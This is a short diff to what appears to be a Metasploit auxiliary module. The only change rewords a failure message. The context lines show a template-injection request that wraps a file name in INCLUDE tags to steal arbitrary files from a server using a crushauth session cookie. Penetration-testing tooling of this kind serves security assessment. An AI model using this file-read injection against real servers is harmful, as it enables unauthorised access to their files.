@@ -105,7 +105,7 @@ class MetasploitModule < Msf::Auxiliary
     res_steal_file = perform_template_injection("#{file_begin_tag}<INCLUDE>#{file_name}</INCLUDE>#{file_end_tag}", crushauth_cookie)
 
     # Check for failure conditions
-    fail_with(Failure::Unknown, 'Connection failed') unless res_steal_file
+    fail_with(Failure::Unknown, 'Connection failed - unable to perform template injection') unless res_steal_file
 
     if (res_steal_file&.code != 200) || !(res_steal_file.body.include? file_begin_tag)
       fail_with(Failure::Unknown, 'The application did not return the file contents as expected')
